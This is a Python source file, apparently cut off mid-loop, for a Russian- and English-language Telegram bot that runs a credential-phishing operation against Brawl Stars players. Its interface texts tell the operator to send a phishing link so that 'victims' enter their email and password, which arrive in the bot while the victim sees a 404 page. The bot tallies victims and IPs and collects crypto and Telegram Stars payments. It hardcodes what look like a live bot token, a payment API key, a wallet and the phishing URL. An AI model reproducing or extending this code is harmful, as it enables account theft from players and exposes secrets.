import requests
import time
import json
import threading
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from collections import deque

BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
ADMIN_ID = 8744429026
ADMIN_USERNAME = "NeresVoid"
PHISHING_URL = "https://da.gd/tzO5QW"

# Твой TON кошелёк для USDT
TON_WALLET = "UQCCjSOpDOYPjoDK18dB7JRNSGmxqN9zacsrVQv-ftXuTjwt"

# CryptoBot API ключ
CRYPTOBOT_API_KEY = "593895:AA6NpZIKwdrRXuYYTzV4EPGYmf99j8aFKMU"

last_update_id = 0
victims = []
user_language = {}
tickets = {}
admin_reply_context = {}
pending_payments = {}
pending_crypto_invoices = {}

# Хранилище последних 5 запросов для каждого пользователя
user_last_requests = {}

# ========== ФУНКЦИИ CRYPTOBOT ==========
def create_crypto_invoice(amount, asset="USDT"):
    """Создаёт счёт в CryptoBot и возвращает pay_url и invoice_id"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_API_KEY}
    data = {
        "asset": asset,
        "amount": str(amount),
        "description": f"Donation {amount} USDT"
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        result = response.json()
        if result.get("ok"):
            return result["result"]["pay_url"], result["result"]["invoice_id"]
        else:
            print(f"CryptoBot error: {result}")
            return None, None
    except Exception as e:
        print(f"Error creating invoice: {e}")
        return None, None

def check_invoice_status(invoice_id):
    """Проверяет статус счёта в CryptoBot"""
    url = "https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_API_KEY}
    data = {"invoice_ids": invoice_id}
    try:
        response = requests.post(url, headers=headers, data=data)
        result = response.json()
        if result.get("ok") and result["result"]["items"]:
            invoice = result["result"]["items"][0]
            status = invoice.get("status")
            if status == "paid":
                return True
        return False
    except:
        return False

# ========== ТЕКСТЫ ==========
TEXTS = {
    'ru': {
        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.\n\n📋 **Последние 5 запросов:**\n{last_requests}",
        'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку\n2️⃣ Жертва вводит почту и пароль\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит 404\n\n⚠️ Ссылка: {url}",
        'data_empty': "📭 **Нет данных**",
        'data_title': "👥 **Пойманные жертвы:**\n\n",
        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери способ доната:",
        'donate_stars': "💫 Telegram Stars",
        'donate_crypto': "₿ Криптовалюта (USDT)",
        'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
        'donate_crypto_invoice': "**₿ ЧЕК НА ОПЛАТУ USDT (через CryptoBot)**\n\n💰 **Сумма:** {amount} USDT\n🆔 **Номер чека:** `{invoice_id}`\n\n📌 **Инструкция:**\n1️⃣ Нажми на кнопку «Оплатить»\n2️⃣ Оплати через **@CryptoBot**\n3️⃣ После оплаты нажми «Проверить оплату»\n\n💎 После подтверждения админ получит уведомление.",
        'payment_received': "✅ **Платёж получен!**\n\n👤 От: @{username}\n💰 Сумма: {amount} USDT\n\nСпасибо за поддержку! 🙌",
        'payment_already_paid': "✅ Этот платёж уже был оплачен.",
        'payment_not_found': "⏳ Платёж пока не найден. Подождите 1-2 минуты и попробуйте снова.",
        'payment_check_error': "❌ Ошибка при проверке платежа. Попробуйте позже.",
        'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
        'lang_changed': "✅ Язык: Русский",
        'lang_changed_en': "✅ Language: English",
        'back': "🔙 Назад",
        'data_btn': "📋 Данные",
        'stats_btn': "📊 Статистика",
        'donate_btn': "⭐ Поддержать",
        'instruction_btn': "📖 Инструкция",
        'settings_btn': "⚙️ Настройки",
        'donate_25_btn': "⭐ 25 звёзд (~50₽)",
        'donate_50_btn': "⭐ 50 звёзд (~100₽)",
        'donate_100_btn': "⭐ 100 звёзд (~200₽)",
        'donate_crypto_1_btn': "₿ 1 USDT (TON)",
        'donate_crypto_2_btn': "₿ 2 USDT (TON)",
        'contact_admin_btn': "📩 Поддержка",
        'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ У тебя активен один тикет. Чтобы создать новый, сначала закрой текущий.",
        'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nДождись ответа администратора или закрой старый тикет командой /close.",
        'ticket_closed': "✅ **Тикет закрыт!**\n\nЕсли у тебя остались вопросы — создай новый тикет кнопкой ниже.",
        'no_active_ticket': "❌ У тебя нет активных тикетов.",
        'ticket_not_found': "❌ Тикет не найден или уже закрыт.",
        'reply_from_admin': "📩 **Ответ от администратора:**\n\n{text}\n\n━━━━━━━━━━━━━━━\n💡 Чтобы закрыть тикет — нажми кнопку ниже.",
        'reply_to_user': "📩 **Ответ пользователю отправлен**",
        'user_message': "📩 **Сообщение от пользователя**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Тикет #{ticket_id}",
        'close_ticket_btn': "❌ Закрыть тикет",
        'reply_btn': "✏️ Ответить",
        'closed_ticket_notify': "🔒 Пользователь закрыл тикет #{ticket_id}",
        'admin_help': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит тебе в этом чате.",
        'self_message_error': "❌ Вы не можете написать сами себе.",
        'creating_invoice': "🔄 Создаём платёж... Подождите."
    },
    'en': {
        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.\n\n📋 **Last 5 requests:**\n{last_requests}",
        'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link\n2️⃣ Victim enters email/password\n3️⃣ Data comes here\n4️⃣ Victim sees 404\n\n⚠️ Link: {url}",
        'data_empty': "📭 **No data**",
        'data_title': "👥 **Victims:**\n\n",
        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total: {total}\n🌐 Unique IPs: {unique}",
        'donate': "✨ **SUPPORT AUTHOR** ✨\n\nChoose donation method:",
        'donate_stars': "💫 Telegram Stars",
        'donate_crypto': "₿ Cryptocurrency (USDT)",
        'donate_sent': "✅ **Invoice created**\n\n- **Product:** 8 GB, 4 vCPU, 75 GB SSD\n- **Quantity:** 1 pc.\n\n- **To pay:** {stars} Telegram Stars\n- **Equivalent:** {rubles}₽\n- **Order number:** {order_id}\n\n**⏱ Time to pay:** 60 minutes\n\nAfter payment, the product will be delivered automatically.",
        'donate_crypto_invoice': "**₿ USDT PAYMENT INVOICE (via CryptoBot)**\n\n💰 **Amount:** {amount} USDT\n🆔 **Invoice ID:** `{invoice_id}`\n\n📌 **Instructions:**\n1️⃣ Click the button below\n2️⃣ Pay via **@CryptoBot**\n3️⃣ After payment, click **Check payment**\n\n💎 Admin will be notified after confirmation.",
        'payment_received': "✅ **Payment received!**\n\n👤 From: @{username}\n💰 Amount: {amount} USDT\n\nThank you for your support! 🙌",
        'payment_already_paid': "✅ This payment has already been made.",
        'payment_not_found': "⏳ Payment not found yet. Wait 1-2 minutes and try again.",
        'payment_check_error': "❌ Error checking payment. Please try again later.",
        'settings': "⚙️ **SETTINGS**\n\nChoose language:",
        'lang_changed': "✅ Language: English",
        'lang_changed_ru': "✅ Язык: Русский",
        'back': "🔙 Back",
        'data_btn': "📋 Data",
        'stats_btn': "📊 Stats",
        'donate_btn': "⭐ Support",
        'instruction_btn': "📖 Guide",
        'settings_btn': "⚙️ Settings",
        'donate_25_btn': "⭐ 25 stars (~€0.5)",
        'donate_50_btn': "⭐ 50 stars (~€1)",
        'donate_100_btn': "⭐ 100 stars (~€2)",
        'donate_crypto_1_btn': "₿ 1 USDT (TON)",
        'donate_crypto_2_btn': "₿ 2 USDT (TON)",
        'contact_admin_btn': "📩 Support",
        'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ You have one active ticket. To create a new one, close the current one.",
        'ticket_already_active': "❌ **You already have an active ticket!**\n\nWait for admin response or close old ticket with /close.",
        'ticket_closed': "✅ **Ticket closed!**\n\nIf you have more questions — create a new ticket using the button below.",
        'no_active_ticket': "❌ You have no active tickets.",
        'ticket_not_found': "❌ Ticket not found or already closed.",
        'reply_from_admin': "📩 **Reply from admin:**\n\n{text}\n\n━━━━━━━━━━━━━━━\n💡 To close the ticket — press the button below.",
        'reply_to_user': "📩 **Reply sent to user**",
        'user_message': "📩 **Message from user**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Ticket #{ticket_id}",
        'close_ticket_btn': "❌ Close ticket",
        'reply_btn': "✏️ Reply",
        'closed_ticket_notify': "🔒 User closed ticket #{ticket_id}",
        'admin_help': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
        'self_message_error': "❌ You cannot message yourself.",
        'creating_invoice': "🔄 Creating payment... Please wait."
    }
}

def get_text(chat_id, key, **kwargs):
    lang = user_language.get(chat_id, 'ru')
    text = TEXTS[lang].get(key, TEXTS['ru'][key])
    return text.format(**kwargs) if kwargs else text

def get_button_text(chat_id, key):
    lang = user_language.get(chat_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    requests.post(url, json=data)

def answer_callback(callback_id, text="", show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    requests.post(url, json=data)

def get_main_keyboard(chat_id):
    if chat_id == ADMIN_ID:
        return [
            [{"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}],
            [{"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}],
            [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}]
        ]
    else:
        return [
            [{"text": get_button_text(chat_id, 'contact_admin_btn'), "callback_data": "create_ticket"}],
            [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}]
        ]

def get_donate_method_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'donate_stars'), "callback_data": "donate_stars_menu"}],
        [{"text": get_button_text(chat_id, 'donate_crypto'), "callback_data": "donate_crypto_menu"}],
        [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
    ]

def get_donate_stars_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'donate_25_btn'), "callback_data": "donate_25"}],
        [{"text": get_button_text(chat_id, 'donate_50_btn'), "callback_data": "donate_50"}],
        [{"text": get_button_text(chat_id, 'donate_100_btn'), "callback_data": "donate_100"}],
        [{"text": get_button_text(chat_id, 'back'), "callback_data": "donate_menu"}]
    ]

def get_donate_crypto_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'donate_crypto_1_btn'), "callback_data": "donate_crypto_1"}],
        [{"text": get_button_text(chat_id, 'donate_crypto_2_btn'), "callback_data": "donate_crypto_2"}],
        [{"text": get_button_text(chat_id, 'back'), "callback_data": "donate_menu"}]
    ]

def get_crypto_invoice_keyboard(pay_url, invoice_id, amount):
    return [
        [{"text": f"💸 Оплатить {amount} USDT", "url": pay_url}],
        [{"text": "✅ Проверить оплату", "callback_data": f"check_crypto_payment_{invoice_id}_{amount}"}],
        [{"text": "🔙 Назад", "callback_data": "donate_crypto_menu"}]
    ]

def get_back_keyboard(chat_id):
    return [[{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]]

def get_language_keyboard():
    return [
        [{"text": "🇷🇺 Русский", "callback_data": "lang_ru"}],
        [{"text": "🇬🇧 English", "callback_data": "lang_en"}],
        [{"text": "⬅️ Назад", "callback_data": "back"}]
    ]

def get_ticket_keyboard(ticket_id):
    return [[{"text": "❌ Закрыть тикет", "callback_data": f"close_ticket_{ticket_id}"}]]

def get_admin_reply_keyboard(user_id, username, ticket_id):
    return [[{"text": "✏️ Ответить", "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]

def generate_ticket_id():
    return int(time.time()) % 1000000

def create_ticket(user_id, username):
    ticket_id = generate_ticket_id()
    tickets[user_id] = {
        "active": True,
        "ticket_id": ticket_id,
        "username": username,
        "messages": [],
        "created_at": time.time()
    }
    return ticket_id

def close_ticket(user_id):
    if user_id in tickets and tickets[user_id]["active"]:
        tickets[user_id]["active"] = False
        return True
    return False

def get_active_ticket(user_id):
    if user_id in tickets and tickets[user_id]["active"]:
        return tickets[user_id]
    return None

def add_user_request(user_id, request_text):
    """Добавляет запрос в историю последних 5 действий пользователя"""
    if user_id not in user_last_requests:
        user_last_requests[user_id] = deque(maxlen=5)
    user_last_requests[user_id].append(request_text)

def get_last_requests_text(user_id):
    """Возвращает форматированный текст последних 5 запросов"""
    if user_id not in user_last_requests or not user_last_requests[user_id]:
        return "Нет запросов"
    
    result = []
    for i, req in enumerate(user_last_requests[user_id], 1):
        result.append(f"{i}. {req}")
    return "\n".join(result)

# ========== ВЕБ-СЕРВЕР ДЛЯ RENDER ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running')
    
    def log_message(self, format, *args):
        pass

def run_health_server():
    port = int(os.environ.get('PORT', 10000))
    try:
        server = HTTPServer(('0.0.0.0', port), HealthHandler)
        server.serve_forever()
    except Exception as e:
        print(f"Веб-сервер остановлен: {e}")

web_thread = threading.Thread(target=run_health_server, daemon=True)
web_thread.start()
time.sleep(2)

print("✅ Бот запущен на Render.com!")
print(f"🔗 Ссылка: {PHISHING_URL}")
print(f"👑 Администратор: @{ADMIN_USERNAME}")
print(f"₿ CryptoBot API ключ загружен")

# ========== ОСНОВНОЙ ЦИКЛ БОТА ==========
while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
        response = requests.get(url).json()

        for update in response.get("result", []):
            last_update_id = update["update_id"]
            message = update.get("message", {})
            callback = update.get("callback_query", {})

            # Обработка сообщений
            if message:
                chat_id = message.get("chat", {}).get("id")
                username = message.get("chat", {}).get("username", "нет")
                text = message.get("text", "")
                
                if chat_id == ADMIN_ID:
                    if text == "/start":
                        user_language[chat_id] = 'ru'
                        last_reqs = get_last_requests_text(chat_id)
                        send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims), last_requests=last_reqs), get_main_keyboard(chat_id))
                    
                    elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                        target_user_id = admin_reply_context[chat_id]["user_id"]
                        target_username = admin_reply_context[chat_id]["username"]
                        ticket_id = admin_reply_context[chat_id].get("ticket_id")
                        
                        reply_text = get_text(target_user_id, 'reply_from_admin', text=text)
                        close_keyboard = [[{"text": "❌ Закрыть тикет", "callback_data": f"close_ticket_{ticket_id}"}]]
                        send_message(target_user_id, reply_text, close_keyboard)
                        send_message(chat_id, f"✅ Ответ отправлен пользователю @{target_username}")
                        
                        if target_user_id in tickets and tickets[target_user_id]["active"]:
                            tickets[target_user_id]["messages"].append({"role": "admin", "text": text, "time": time.time()})
                        
                        admin_reply_context[chat_id] = {}
                    
                    elif text == "/close":
                        send_message(chat_id, "❌ У вас нет активного диалога с пользователем.")
                    
                    else:
                        # Сохраняем запрос админа в историю
                        if text and not text.startswith("/"):
                            add_user_request(chat_id, text[:50] + ("..." if len(text) > 50 else ""))
                        
                        found = False
                        for user_id, payment in list(pending_payments.items()):
                            if str(user_id) in text:
                                rubles = payment["stars"] * 2
                                admin_text = get_text(ADMIN_ID, 'payment_received', 
                                                     username=payment["username"], 
                                                     stars=payment["stars"], 
                                                     rubles=rubles, 
                                                     order_id=payment["order_id"])
                                send_message(ADMIN_ID, admin_text)
                                send_message(user_id, f"✅ Администратор подтвердил оплату {payment['stars']}⭐!\nСпасибо за поддержку! 💙")
                                del pending_payments[user_id]
                                found = True
                                break
                        
                        if not found:
                            send_message(chat_id, "✅ Сообщение получено.")
                
                else:
                    if username == ADMIN_USERNAME or str(chat_id) == str(ADMIN_ID):
                        send_message(chat_id, get_text(chat_id, 'self_message_error'))
                        continue
                    
                    if text == "/start":
                        user_language[chat_id] = 'ru'
                        last_reqs = get_last_requests_text(chat_id)
